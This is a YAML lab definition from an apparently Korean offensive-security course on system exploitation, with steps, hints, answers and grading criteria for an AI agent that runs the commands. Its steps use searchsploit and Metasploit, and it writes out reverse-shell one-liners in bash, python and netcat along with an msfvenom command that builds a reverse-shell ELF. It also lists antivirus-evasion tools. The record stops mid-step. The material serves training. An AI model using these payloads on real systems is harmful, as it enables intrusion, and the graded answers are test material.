lab_id: attack-ai-week07
title: 시스템 익스플로잇 (System Exploits) (AI 지원)
version: ai
course: attack-ai
week: 7
description: 버퍼 오버플로, 서비스 취약점 공격, Metasploit 활용 등 시스템 레벨의 익스플로잇 기법을 실습한다. 취약한 서비스를
  식별하고 공격 코드를 실행하여 초기 접근을 확보한다. AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
difficulty: medium
duration_minutes: 120
objectives:
- Metasploit 프레임워크의 기본 사용법을 익힌다
- 취약한 서비스에 대한 익스플로잇을 선택하고 실행할 수 있다
- 셸을 획득한 후 기본적인 post-exploitation을 수행한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: searchsploit을 사용하여 대상 서버에서 발견된 서비스들(Apache, Node.js, SSH)에 대한 익스플로잇을
    검색하라.
  hint: |
    searchsploit 서비스명 버전 형태로 검색한다.

    📎 도구 우선순위 (힌트):
    1) 우선: searchsploit apache 2.4 && echo '---' && searchsploit openssh
    2) 미설치: sudo apt install -y exploitdb && searchsploit -u
    3) 실패/대안:
       - exploit-db.com 웹 검색
       - msfconsole search type:exploit
       - vulners-cli (CVE 매핑)
       - cve-search 자체 호스팅
       - rapid7 vulnerability database
       - cvedetails.com
       - GitHub PoC repos (nomi-sec/PoC-in-GitHub)
    4) 검증: EDB-ID + Path. -m 으로 PoC 복사.
  category: recon
  points: 10
  answer: '🤖 프롬프트: searchsploit을 사용하여 대상 서버에서 발견된 서비스들(Apache, Node.js, SSH)에 대한 익스플로잇을
    검색해줘

    📎 참고 (CLI): searchsploit apache 2.4 && echo ''---'' && searchsploit openssh'
  answer_detail: searchsploit은 Exploit-DB의 로컬 검색 도구로, 서비스명과 버전으로 공개된 익스플로잇을 검색한다.
    -m 옵션으로 익스플로잇 코드를 현재 디렉토리에 복사할 수 있다.
  verify:
    type: output_contains
    expect:
    - Exploit
    - exploit
    field: stdout
    semantic:
      intent: searchsploit 로 Apache/OpenSSH 발견 서비스별 익스플로잇 PoC 검색 — 후속 공격 선별
      success_criteria:
      - searchsploit apache 2.4 + searchsploit openssh 실행
      - 결과 테이블에 Exploit Title + Path 최소 2개
      - 서비스·버전 매칭의 중요성 언급
      acceptable_methods:
      - "searchsploit apache 2.4 + openssh (수기 baseline)."
      - "searchsploit -m <id> PoC 복사."
      - "Exploit-DB 웹 검색."
      - "msfconsole search type:exploit."
      - "vulners-cli."
      - "cve-search 자체 호스팅."
      - "rapid7/cvedetails."
      - "GitHub PoC repos."
      - "Bastion AI exploit 추천 orchestrator."
      negative_signs:
      - 단일 서비스만 검색
      - Exploit 컬럼 해석 없이 raw 출력
      - 버전 매칭 원칙 언급 없음
  target_vm: attacker
  script: searchsploit apache 2.4 && echo '---' && searchsploit openssh
  risk_level: low
  bastion_prompt: 'searchsploit을 사용하여 대상 서버에서 발견된 서비스들(Apache, Node.js, SSH)에 대한 익스플로잇을
    검색해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 2
  instruction: msfconsole에서 사용 가능한 exploit 모듈 중 http 관련 모듈을 검색하라.
  hint: |
    msfconsole -q -x 'search type:exploit http; exit' 형태로 실행한다.

    📎 도구 우선순위 (힌트):
    1) 우선: msfconsole -q -x 'search type:exploit name:nodejs; exit' 2>/dev/null | head -30
    2) 미설치: sudo apt install -y metasploit-framework
    3) 실패/대안:
       - msfconsole 대화형 + search
       - msf-pro / Pro Console
       - Cobalt Strike (상용)
       - Empire / Starkiller (PowerShell C2)
       - Sliver (오픈소스 C2)
       - Caldera (MITRE C2 emulation)
       - BeEF (브라우저 기반)
    4) 검증: exploit 키워드 + Disclosure Date.
  category: recon
  points: 10
  answer: '🤖 프롬프트: msfconsole에서 사용 가능한 exploit 모듈 중 http 관련 모듈을 검색해줘

    📎 참고 (CLI): msfconsole -q -x ''search type:exploit name:nodejs; exit'' 2>/dev/null
    | head -30'
  answer_detail: Metasploit은 세계 최대의 침투 테스트 프레임워크로, 수천 개의 익스플로잇 모듈을 포함한다. search 명령으로
    대상 서비스에 적합한 모듈을 찾고, 자동화된 공격을 수행할 수 있다.
  verify:
    type: output_contains
    expect: exploit
    field: stdout
    semantic:
      intent: <SENSITIVE:4d8adcc595ead58e>
      success_criteria:
      - msfconsole -q -x search 명령 실행
      - 결과에 Matching Modules 테이블 + exploit/ 경로
      - search 필터(type/name/cve/rank) 활용법 언급
      acceptable_methods:
      - "msfconsole -q -x search (수기 baseline)."
      - "msfconsole + interactive search."
      - "msf-rpc API."
      - "msf-pro Pro Console."
      - "Empire / Starkiller (PowerShell C2)."
      - "Sliver C2."
      - "Caldera (MITRE)."
      - "BeEF (브라우저)."
      - "Bastion AI exploit 추천 orchestrator."
      negative_signs:
      - 단순 search 로 모든 모듈 출력
      - 결과 해석 없음
      - search 필터 문법 언급 없음
  target_vm: attacker
  script: msfconsole -q -x 'search type:exploit name:nodejs; exit' 2>/dev/null | head
    -30
  risk_level: low
  bastion_prompt: 'msfconsole에서 사용 가능한 exploit 모듈 중 http 관련 모듈을 검색해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 3
  instruction: JuiceShop(Node.js)에 대해 Metasploit의 auxiliary 스캐너를 사용하여 HTTP 정보를 수집하라.
  hint: |
    auxiliary/scanner/http/http_version 모듈을 사용한다.

    📎 도구 우선순위 (힌트):
    1) 우선: msfconsole -q -x 'use auxiliary/scanner/http/http_version; set RHOSTS 10.20.30.80; set RPORT 3000; run; exit' 2>/dev/null
    2) 미설치: sudo apt install -y metasploit-framework
    3) 실패/대안:
       - whatweb -v http://10.20.30.80:3000
       - curl -I (Server 헤더)
       - nikto -h 10.20.30.80:3000
       - wappalyzer-cli
       - httpx -title -tech-detect
       - nmap -sV --script http-headers
       - webanalyze
    4) 검증: Server / X-Powered-By. recon 단계.
  category: recon
  points: 10
  answer: '🤖 프롬프트: JuiceShop(Node.js)에 대해 Metasploit의 auxiliary 스캐너를 사용하여 HTTP 정보를
    수집해줘

    📎 참고 (CLI): msfconsole -q -x ''use auxiliary/scanner/http/http_version; set RHOSTS
    10.20.30.80; set RPORT 3000; run; exit'' 2>/dev/null'
  answer_detail: Metasploit의 auxiliary 모듈은 정보 수집, 스캐닝, 서비스 열거에 사용된다. exploit과 달리 공격을
    수행하지 않으며, 대상 시스템의 정보를 안전하게 수집한다.
  verify:
    type: output_contains
    expect: 10.20.30.80
    field: stdout
    semantic:
      intent: <SENSITIVE:621c0d6683dbdced>
      success_criteria:
      - msfconsole 에서 use auxiliary/scanner/http/http_version 후 RHOSTS=<IP> RPORT=3000
        run
      - 출력에 대상 IP 와 Server 헤더 값 최소 1개
      - auxiliary vs exploit 모듈 차이 언급
      acceptable_methods:
      - "msfconsole auxiliary/scanner/http/http_version (수기 baseline)."
      - "whatweb -v."
      - "curl -I (Server 헤더)."
      - "nikto -h."
      - "wappalyzer-cli."
      - "httpx -title -tech-detect."
      - "nmap -sV --script http-headers."
      - "webanalyze."
      - "Bastion AI HTTP recon orchestrator."
      negative_signs:
      - RHOSTS 누락으로 실행 실패
      - auxiliary 가 아닌 exploit 사용 (공격 의도)
      - 수집 정보 해석 없음
  target_vm: attacker
  script: msfconsole -q -x 'use auxiliary/scanner/http/http_version; set RHOSTS 10.20.30.80;
    set RPORT 3000; run; exit' 2>/dev/null
  risk_level: low
  bastion_prompt: 'JuiceShop(Node.js)에 대해 Metasploit의 auxiliary 스캐너를 사용하여 HTTP 정보를
    수집해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 4
  instruction: netcat으로 간단한 리버스 셸 리스너를 설정하라. 포트 4444에서 연결을 대기하라(5초 후 자동 종료).
  hint: |
    nc -lvnp 포트 형태로 리스너를 설정한다.

    📎 도구 우선순위 (힌트):
    1) 우선: timeout 5 nc -lvnp 4444 2>&1 & echo 'Listener started on port 4444' && sleep 1 && echo test | nc -w 1 localhost 4444
    2) 미설치: sudo apt install -y ncat netcat-openbsd
    3) 실패/대안:
       - ncat --listen -p 4444 -v
       - socat TCP-LISTEN:4444,reuseaddr -
       - pwncat-cs (autoupgrade tty)
       - rlwrap nc -lvnp 4444
       - python3 socket bind+listen
       - msfconsole multi/handler
       - HoaxShell (HTTP 기반)
    4) 검증: Listening on / connection received. T1059.
  category: exploit
  points: 10
  answer: '🤖 프롬프트: netcat으로 간단한 리버스 셸 리스너를 설정해줘

    📎 참고 (CLI): timeout 5 nc -lvnp 4444 2>&1 & echo ''Listener started on port 4444''
    && sleep 1 && echo ''test connection'' | nc -w 1 localhost 4444 2>/dev/null; wait'
  answer_detail: 리버스 셸 리스너는 공격자 측에서 연결을 대기하는 서버이다. 대상 시스템에서 역방향으로 연결을 맺으면(reverse
    shell), 방화벽의 outbound 규칙을 우회하여 셸 접근이 가능하다.
  verify:
    type: output_contains
    expect:
    - Listener started
    - nc
    field: stdout
    semantic:
      intent: netcat 리버스 셸 리스너 설정 — 포트 4444 에서 inbound 연결 대기 (timeout 5초로 자동 종료, 교육용)
      success_criteria:
      - timeout 5 nc -lvnp 4444 & 형태로 백그라운드 리스너 기동
      - Listener started on port 4444 출력 또는 ss -tlnp 로 4444 확인
      - 리버스 셸 방향(outbound from target → inbound to attacker) 개념 언급
      acceptable_methods:
      - "timeout 5 nc -lvnp 4444 (수기 baseline)."
      - "ncat --listen -p 4444 -v --ssl."
      - "socat TCP-LISTEN:4444,fork -."
      - "pwncat-cs (autoupgrade tty)."
      - "rlwrap nc -lvnp."
      - "python3 socket bind+listen."
      - "msfconsole multi/handler."
      - "HoaxShell HTTP."
      - "Bastion AI 리스너 orchestrator."
      negative_signs:
      - timeout 없이 무한 대기
      - -l 없이 클라이언트 모드
      - 리버스 셸 원리 언급 없음
  target_vm: attacker
  script: timeout 5 nc -lvnp 4444 2>&1 & echo 'Listener started on port 4444' && sleep
    1 && echo 'test connection' | nc -w 1 localhost 4444 2>/dev/null; wait
  risk_level: medium
  bastion_prompt: 'netcat으로 간단한 리버스 셸 리스너를 설정해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 5
  instruction: bash 리버스 셸 페이로드를 생성하라. python3으로 {{ATTACKER_IP}}:4444로 연결하는 리버스 셸 명령을
    출력하라(실행하지 않고 출력만).
  hint: |
    bash -i >& /dev/tcp/IP/PORT 0>&1 형태이다.

    📎 도구 우선순위 (힌트):
    1) 우선: echo 'Bash: bash -i >& /dev/tcp/10.20.30.201/4444 0>&1' + Python + Netcat 페이로드 출력
    2) 미설치: 페이로드 출력만 (실행 X)
    3) 실패/대안:
       - perl/php/ruby/golang reverse shell
       - revshells.com 페이로드 생성기
       - PayloadsAllTheThings 깃허브
       - HoaxShell (HTTP 기반)
       - Chisel TCP tunneling
       - GTFOBins 셸 escape
       - msfvenom shell_reverse_tcp
    4) 검증: 다양한 언어 페이로드 + IP/PORT 일치. T1059.
  category: exploit
  points: 10
  answer: '🤖 프롬프트: bash 리버스 셸 페이로드를 생성하라. python3으로 10.20.30.201:4444로 연결하는 리버스 셸
    명령을 출력하라(실행하지 않고 출력만)해줘

    📎 참고 (CLI): echo ''=== Reverse Shell Payloads ==='' && echo ''Bash: bash -i >&
    /dev/tcp/10.20.30.201/4444 0>&1'' && echo ''Python: python3 -c "import socket,subprocess,os;s=socket.socket();s.connect((\"10.20.30.201\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])"''
    && echo ''Netcat: nc -e /bin/bash 10.20.30.201 4444'''
  answer_detail: 리버스 셸 페이로드는 다양한 언어(Bash, Python, Perl, PHP, Netcat)로 생성할 수 있다. 대상
    시스템에서 사용 가능한 도구에 따라 적절한 페이로드를 선택한다.
  verify:
    type: output_contains
    expect:
    - Reverse Shell Payloads
    - payload
    field: stdout
    semantic:
      intent: 리버스 셸 페이로드 3종 생성(출력만) — Bash(bash -i /dev/tcp), Python3(socket+subprocess),
        Netcat(nc -e) 언어별 대안
      success_criteria:
      - === Reverse Shell Payloads === 헤더 + 3가지 payload 문자열 출력
      - 각 payload 에 LHOST:LPORT 구체값 포함
      - 실행 안 하고 문자열로만 출력 (학습용)
      acceptable_methods:
      - "echo Bash + Python + Netcat 3종 (수기 baseline)."
      - "perl/php/ruby/golang reverse shell."
      - "msfvenom shell_reverse_tcp."
      - "revshells.com 생성기."
      - "PayloadsAllTheThings."
      - "HoaxShell HTTP."
      - "Chisel tunneling."
      - "pentestmonkey cheatsheet."
      - "Bastion AI 페이로드 생성 orchestrator."
      negative_signs:
      - payload 1종만
      - LHOST/LPORT 플레이스홀더 미치환
      - 실제 실행 (출력만 하라는 의도 위배)
  target_vm: attacker
  script: 'echo ''=== Reverse Shell Payloads ==='' && echo ''Bash: bash -i >& /dev/tcp/10.20.30.201/4444
    0>&1'' && echo ''Python: python3 -c "import socket,subprocess,os;s=socket.socket();s.connect((\"10.20.30.201\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])"''
    && echo ''Netcat: nc -e /bin/bash 10.20.30.201 4444'''
  risk_level: medium
  bastion_prompt: 'bash 리버스 셸 페이로드를 생성하라. python3으로 10.20.30.201:4444로 연결하는 리버스 셸
    명령을 출력하라(실행하지 않고 출력만)해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 6
  instruction: msfvenom을 사용하여 Linux x64 리버스 셸 ELF 바이너리를 생성하라. LHOST={{ATTACKER_IP}},
    LPORT=4444로 설정하라.
  hint: |
    msfvenom -p linux/x64/shell_reverse_tcp 옵션을 사용한다.

    📎 도구 우선순위 (힌트):
    1) 우선: msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.20.30.201 LPORT=4444 -f elf -o /tmp/reverse_shell.elf && file /tmp/reverse_shell.elf
    2) 미설치: sudo apt install -y metasploit-framework
    3) 실패/대안:
       - msfvenom + -e x64/xor_dynamic
       - Veil Framework (AV 회피)
       - Shellter PE injection
       - Donut .NET assembly
       - shellcraft (pwntools)
       - C 자작 + execve()
       - garble Go obfuscation
    4) 검증: ELF 64-bit + LHOST/LPORT.
  category: exploit
  points: 10
  answer: '🤖 프롬프트: msfvenom을 사용하여 Linux x64 리버스 셸 ELF 바이너리를 생성하라. LHOST=10.20.30.201,
    LPORT=4444로 설정해줘

    📎 참고 (CLI): msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.20.30.201 LPORT=4444
    -f elf -o /tmp/reverse_shell.elf 2>/dev/null && file /tmp/reverse_shell.elf &&
    ls -la /tmp/reverse_shell.elf'
  answer_detail: msfvenom은 Metasploit의 페이로드 생성 도구이다. 다양한 OS/아키텍처(Windows, Linux, macOS)와
    출력 형식(ELF, EXE, Python, PHP 등)을 지원한다. 실전에서는 AV 회피를 위해 인코딩을 적용한다.
  verify:
    type: output_contains
    expect: ELF
    field: stdout
